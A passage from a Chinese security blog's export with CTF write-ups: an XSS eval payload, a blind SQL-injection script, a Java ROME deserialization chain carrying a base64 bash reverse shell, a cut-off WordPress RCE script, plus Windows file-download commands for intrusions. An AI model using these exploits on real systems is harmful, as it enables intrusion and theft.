&#x3D; btoa(cmd)</span><br><span class=\"line\">        url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:13002&#x2F;?name&#x3D;%3Cimg%20src%3Dx%20onerror%3D&#39;eval(atob(%22&quot;+cmd+&quot;%22))&#39;)%3E&quot;</span><br><span class=\"line\">        const words &#x3D;[&#39;web&#39;, &#39;bytedance&#39;, &#39;ctf&#39;, &#39;sing&#39;, &#39;jump&#39;, &#39;rap&#39;, &#39;basketball&#39;, &#39;hello&#39;,&#39;world&#39;,&#39;fighting&#39;,&#39;flag&#39;,&#39;game&#39;,&#39;happy&#39;]</span><br><span class=\"line\">        i &#x3D; 0</span><br><span class=\"line\">        l &#x3D; 0</span><br><span class=\"line\">        iframe.onload &#x3D; function () &#123;</span><br><span class=\"line\">            const w &#x3D; iframe.contentWindow</span><br><span class=\"line\">            w.location.replace(url + &quot;#&quot; + words[i]);</span><br><span class=\"line\">            if (i &#x3D;&#x3D; 12) &#123;</span><br><span class=\"line\">                i &#x3D; 0;</span><br><span class=\"line\">                if (l++ &gt; 13) &#123;</span><br><span class=\"line\">                    fetch(&#39;&#x2F;?done&#39;)</span><br><span class=\"line\">                    iframe.onload &#x3D; function () &#123; &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                i++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>\n\n<p>放到服务器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163903976.png\" alt=\"image-20220927163903976\"></p>\n<p>FLAG：ByteCTF{074720d3-9369-4457-a1a5-2cdf1fda594b}</p>\n<p>补充，因为能直接通过report访问status直接执行命令，还可以利用4字符去rce，exp网上很多了。</p>\n<h1 id=\"datamanager\"><a href=\"#datamanager\" class=\"headerlink\" title=\"datamanager\"></a>datamanager</h1><p>登录框</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225908732.png\" alt=\"image-20220925225908732\"></p>\n<p>注册admin</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225930544.png\" alt=\"image-20220925225930544\"></p>\n<p>new data source有任意数据库连接，可以尝试恶意数据库读文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225950569.png\" alt=\"image-20220925225950569\"></p>\n<p>基本信息为上。</p>\n<p>W&amp;M的wp：</p>\n<p>存在注入</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sre_constants <span class=\"keyword\">import</span> SUCCESS</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">requests = requests.Session()</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\">proxies = &#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">import</span> warnings</span><br><span class=\"line\">warnings.filterwarnings(<span class=\"string\">&quot;ignore&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Cookie&quot;</span>: <span class=\"string\">&quot;__t_id=7267900aaba9b607c88b9639ae26899a; JSESSIONID=C1032349BC4000AE184AD31889B5B0F3&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#database() == datamanager</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#tables : source,users</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(table_name) from information_schema.tables where table_schema like 0x646174616d616e61676572) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#columns from users: current\\\\_connections,total\\\\_connections,user,id,n4me,pas$word</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(column_name) from information_schema.columns where table_name like 0x7573657273) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#n4me from users: ctf,...</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(n4me) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pas$word from users: ctf@BvteDaNceS3cRet,...</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(pas$word) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        success = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> string.printable[:-<span class=\"number\">6</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> <span class=\"string\">&quot;_%[]&quot;</span>:</span><br><span class=\"line\">                i = <span class=\"string\">&quot;\\\\\\\\&quot;</span>+i</span><br><span class=\"line\">            payload = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> flag:</span><br><span class=\"line\">                payload += <span class=\"string\">&quot;%02x&quot;</span> % <span class=\"built_in\">ord</span>(item)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">                payload += <span class=\"string\">&quot;%02x&quot;</span> % <span class=\"built_in\">ord</span>(item)</span><br><span class=\"line\">            payload += <span class=\"string\">&quot;25&quot;</span></span><br><span class=\"line\">            <span class=\"comment\">#print(payload)</span></span><br><span class=\"line\">            r = requests.get(url.replace(<span class=\"string\">&quot;PAYLOAD&quot;</span>,payload),proxies=proxies,headers=headers,verify=<span class=\"literal\">False</span>,timeout=<span class=\"number\">3</span>)</span><br><span class=\"line\">            <span class=\"comment\">#if &quot;SORRY!&quot; not in r.text:</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> r.status_code == <span class=\"number\">200</span>:</span><br><span class=\"line\">                flag += i</span><br><span class=\"line\">                print(flag)</span><br><span class=\"line\">                success = <span class=\"literal\">True</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> success:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;failed&quot;</span>,flag)</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&quot;failed&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>后来用恶意sqlserver利用netdoc协议读文件去了，未能复现</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">用mysql fake server来读文件。需要修改一下 handshake.py的72行d[2]改成0x21 否则报错</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.wm-team.cn/index.php/archives/28/\">ByteCTF 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>\n","categories":["赛题wp"]},{"title":"cmd 环境下载文件的几种方法","url":"/2023/12/25/cmd%20%E7%8E%AF%E5%A2%83%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>转载于：<a href=\"https://www.jianshu.com/p/afb1e7b8acaf\">cmd 环境下载文件的几种方法</a></p>\n<p>在渗透中通常会遇到只有cmd shell的情况，在这种情况下，通常需要下载文件来进行后续渗透。这里记录了几种在cmd下不需要其他三方程序就可以直接下载文件的方法。</p>\n<a id=\"more\"></a>\n<h1 id=\"certutil\"><a href=\"#certutil\" class=\"headerlink\" title=\"certutil\"></a>certutil</h1><blockquote>\n<p>certutil -urlcache -split -f <a href=\"https://www.xxx.com/test.py\">https://www.xxx.com/test.py</a><br>certutil -urlcache -split -f <a href=\"https://www.xxx.com/test.py\">https://www.xxx.com/test.py</a> ff.py #指定保存文件名</p>\n</blockquote>\n<h1 id=\"bitsadmin\"><a href=\"#bitsadmin\" class=\"headerlink\" title=\"bitsadmin\"></a>bitsadmin</h1><blockquote>\n<p>bitsadmin /transfer n <a href=\"http://www.xx.com/code.jpg\">http://www.xx.com/code.jpg</a> c:\\users\\sdyp\\desktop\\ff.jpg</p>\n</blockquote>\n<h1 id=\"powershell\"><a href=\"#powershell\" class=\"headerlink\" title=\"powershell\"></a>powershell</h1><blockquote>\n<p>powershell (new-object System.Net.WebClient).DownloadFile( ‘<a href=\"http://www.xx.com/ff.jpg&#39;,&#39;c:\\aaa.jpg&#39;\">http://www.xx.com/ff.jpg&#39;,&#39;c:\\aaa.jpg&#39;</a>)</p>\n</blockquote>\n<h1 id=\"ftp\"><a href=\"#ftp\" class=\"headerlink\" title=\"ftp\"></a>ftp</h1><blockquote>\n<p>echo open 8.8.8.8  &gt;a.txt &amp; echo get fuck.exe&gt;&gt;a.txt &amp;echo bye&gt;&gt;a.txt<br>ftp -A -s:a.txt</p>\n</blockquote>\n<h1 id=\"vbs\"><a href=\"#vbs\" class=\"headerlink\" title=\"vbs\"></a>vbs</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#用echo写入</span><br><span class=\"line\">On Error Resume Next  </span><br><span class=\"line\">Dim iRemote,iLocal  </span><br><span class=\"line\">iLocal &#x3D; LCase(WScript.Arguments(1))  </span><br><span class=\"line\">iRemote &#x3D; LCase(WScript.Arguments(0))  </span><br><span class=\"line\">Set xPost &#x3D; createObject(&quot;Microsoft.XMLHTTP&quot;) </span><br><span class=\"line\">xPost.Open &quot;GET&quot;,iRemote,0 </span><br><span class=\"line\">xPost.Send() </span><br><span class=\"line\">Set sGet &#x3D; createObject(&quot;ADODB.Stream&quot;) </span><br><span class=\"line\">sGet.Mode &#x3D; 3 </span><br><span class=\"line\">sGet.Type &#x3D; 1 </span><br><span class=\"line\">sGet.Open() </span><br><span class=\"line\">sGet.Write(xPost.responseBody) </span><br><span class=\"line\">sGet.SaveToFile iLocal,2 </span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>cscript ff.vbs <a href=\"http://www.xxx.com/xx.jpg\">http://www.xxx.com/xx.jpg</a> xx.jpg</p>\n</blockquote>\n","categories":["渗透"]},{"title":"D3 CTF","url":"/2023/12/25/d3ctf/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/4755f794d50b55e359f52f23603d7207.png\" alt=\"image-20220323195235536\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"shorter\"><a href=\"#shorter\" class=\"headerlink\" title=\"shorter\"></a>shorter</h1><ul>\n<li>ROME 链</li>\n<li>java 反序列化缩小</li>\n</ul>\n<p>附件给了一个jar包，反编译后发现反序列化点，但是有长度限制1956</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/62a0740b1fb547f2eebbc19cf95af830.png\" alt=\"image-20220308194019489\"></p>\n<p>看一下lib库，发现了rome-1.0，这个依赖存在反序列化点</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/c9d04b7ddb6d93f6a672852df4d090da.png\" alt=\"image-20220308194134089\"></p>\n<p>所以思路就是通过缩小后的 rome 链子打过去，说到缩小payload的技术，许少的文章和工具：</p>\n<p><a href=\"https://xz.aliyun.com/t/10824\">终极Java反序列化Payload缩小技术 - 先知社区 (aliyun.com)</a></p>\n<p>rome链：<a href=\"https://www.yuque.com/jinjinshigekeaigui/qskpi5/cz1um4#asSav\">Java安全之ROME反序列化利用分析 · 语雀 (yuque.com)</a> 、<a href=\"https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html\">ROME反序列化分析 (c014.cn)</a></p>\n<p>先手动尝试构造</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.sec.payload;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtConstructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtNewConstructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ROME</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">byte</span>[] getShortTemplatesImpl(String cmd) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            ClassPool pool = ClassPool.getDefault();</span><br><span class=\"line\">            CtClass ctClass = pool.makeClass(<span class=\"string\">&quot;Evil&quot;</span>);</span><br><span class=\"line\">            CtClass superClass = pool.get(<span class=\"string\">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class=\"line\">            ctClass.setSuperclass(superClass);</span><br><span class=\"line\">            CtConstructor constructor = CtNewConstructor.make(<span class=\"string\">&quot;    public Evil()&#123;\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;        try &#123;\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;            Runtime.getRuntime().exec(\\&quot;&quot;</span> + cmd + <span class=\"string\">&quot;\\&quot;);\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;        &#125;catch (Exception ignored)&#123;&#125;\\n&quot;</span> +</span><br><span class=\"line\">                    <span class=\"string\">&quot;    &#125;&quot;</span>, ctClass);</span><br><span class=\"line\">            ctClass.addConstructor(constructor);</span><br><span class=\"line\">            <span class=\"keyword\">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class=\"line\">            ctClass.defrost();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[]&#123;&#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//TemplateImpl 动态加载字节码</span></span><br><span class=\"line\">        <span class=\"comment\">//byte[] code = ClassPool.getDefault().get(&quot;com.bytecode.exp&quot;).toBytecode();</span></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = getShortTemplatesImpl(<span class=\"string\">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNi4xMTAuNjEvMzAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class=\"line\">        TemplatesImpl obj = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        setFieldValue(obj,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\">        setFieldValue(obj,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        <span class=\"comment\">// setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class=\"line\">        setFieldValue(obj,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        EqualsBean bean = <span class=\"keyword\">new</span> EqualsBean(String.class,<span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap map1 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        HashMap map2 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        map1.put(<span class=\"string\">&quot;yy&quot;</span>,bean);</span><br><span class=\"line\">        map1.put(<span class=\"string\">&quot;zZ&quot;</span>,obj);</span><br><span class=\"line\">        map2.put(<span class=\"string\">&quot;zZ&quot;</span>,bean);</span><br><span class=\"line\">        map2.put(<span class=\"string\">&quot;yy&quot;</span>,obj);</span><br><span class=\"line\">        Hashtable table = <span class=\"keyword\">new</span> Hashtable();</span><br><span class=\"line\">        table.put(map1,<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">        table.put(map2,<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        setFieldValue(bean,<span class=\"string\">&quot;_beanClass&quot;</span>,Templates.class);</span><br><span class=\"line\">        setFieldValue(bean,<span class=\"string\">&quot;_obj&quot;</span>,obj);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//序列化</span></span><br><span class=\"line\">        ByteArrayOutputStream baos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(baos);</span><br><span class=\"line\">        oos.writeObject(table);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//反序列化</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span></span><br><span class=\"line\"><span class=\"comment\">//        ObjectInputStream ois = new ObjectInputStream(bais);</span></span><br><span class=\"line\"><span class=\"comment\">//        ois.readObject();</span></span><br><span class=\"line\"><span class=\"comment\">//        ois.close();</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/f51cd7b57c8a268ae81e7ed2bb50f036.png\" alt=\"image-20220309082242447\"></p>\n<p>尝试将rome链子直接放到工具里面，自动生成</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> org.sec.payload;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ROME</span> <span class=\"keyword\">extends</span> <span class=\"title\">Payload</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">byte</span>[] getPayloadUseCommand(String cmd) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = Generator.getTemplateImplBytes(cmd);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getPayloadUseByteCodes(code);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">byte</span>[] getPayloadUseByteCodes(<span class=\"keyword\">byte</span>[] byteCodes)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            TemplatesImpl obj = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">            setFieldValue(obj,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\">            setFieldValue(obj,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"keyword\">null</span>);</span><br><span class=\"line\">            <span class=\"comment\">// setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class=\"line\">            setFieldValue(obj,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;byteCodes&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">            EqualsBean bean = <span class=\"keyword\">new</span> EqualsBean(String.class,<span class=\"string\">&quot;jiang&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            HashMap map1 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">            HashMap map2 = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">            map1.put(<span class=\"string\">&quot;yy&quot;</span>,bean);</span><br><span class=\"line\">            map1.put(<span class=\"string\">&quot;zZ&quot;</span>,obj);</span><br><span class=\"line\">            map2.put(<span class=\"string\">&quot;zZ&quot;</span>,bean);</span><br><span class=\"line\">            map2.put(<span class=\"string\">&quot;yy&quot;</span>,obj);</span><br><span class=\"line\">            Hashtable table = <span class=\"keyword\">new</span> Hashtable();</span><br><span class=\"line\">            table.put(map1,<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">            table.put(map2,<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            setFieldValue(bean,<span class=\"string\">&quot;_beanClass&quot;</span>,Templates.class);</span><br><span class=\"line\">            setFieldValue(bean,<span class=\"string\">&quot;_obj&quot;</span>,obj);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//序列化</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> serialize(table);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;<span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[]&#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>maven打包生成jar包</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNi4xMTAuNjEvMzAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/285bd8f4c688389b2fd1281586fc04f1.png\" alt=\"image-20220309000546116\"></p>\n<p>传paylaod时，url加密一下，还有Y4的 <a href=\"https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/\">ROME改造计划 | Y4tacker’s Blog</a></p>\n<h1 id=\"NewestWordPress\"><a href=\"#NewestWordPress\" class=\"headerlink\" title=\"NewestWordPress\"></a>NewestWordPress</h1><ul>\n<li>wordpress</li>\n<li>php_everywhere</li>\n<li>mysql udf提权</li>\n</ul>\n<p>描述</p>\n<p>The newest WordPress version! Oh… 5.9.1 is the newest…<br>P.S. Challenge environment reset every 10min.</p>\n<p>Hint:<br>WordPress 和 UsersWP 都是最新版本<br>问题不在 WordPress 和 UsersWP 上<br>而在一个 WPScan 没有识别出的插件上</p>\n<p>找到最近出漏洞的插件 <strong>php_everywhere</strong> <a href=\"https://threatpost.com/php-everywhere-bugs-wordpress-rce/178338/\">https://threatpost.com/php-everywhere-bugs-wordpress-rce/178338/</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;d3wordpress.d3ctf-challenge.n3ko.co&#x2F;wp-content&#x2F;plugins&#x2F;php-everywhere&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>插件 php-everywhere 最新的洞 <strong>CVE-2022-24663</strong> 可以任意代码执行</p>\n<p><a href=\"https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/\">https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/</a></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># getshell.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># base_url = &quot;http://d3wordpress.d3ctf-challenge.n3ko.co&quot;</span></span><br><span class=\"line\">base_url = <span class=\"string\">&quot;http://global-wordpress-d3ctf-challenge.n3ko.co&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getShell</span>():</span></span><br><span class=\"line\">\tsess = requests.session()</span><br><span class=\"line\">\tlogin_url = base_url + <span class=\"string\">&quot;/wp-login.php&quot;</span></span><br><span class=\"line\">\tlogin_data = &#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;log&quot;</span>: <span class=\"string\">&quot;test&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pwd&quot;</span>: <span class=\"string\">&quot;testtest&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;wp-submit&quot;</span>: <span class=\"string\">&quot;Log In&quot;</span>,</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tres = sess.post(login_url, data=login_data)</span><br><span class=\"line\">\t<span class=\"comment\"># print(res.text)</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgetShell_url = base_url + <span class=\"string\">&quot;/wp-admin/admin-ajax.php&quot;</span></span><br><span class=\"line\">\tencoded_payload =\t<span class=\"string\">&#x27;W3BocF9ldmVyeXdoZXJlXTw/cGhwCnByaW50KF9fRElSX18pOwokYj0nUEQ5d2FIQUtaWFpoYkNna1gxQlBVMVJiSjJ</span></span><br><span 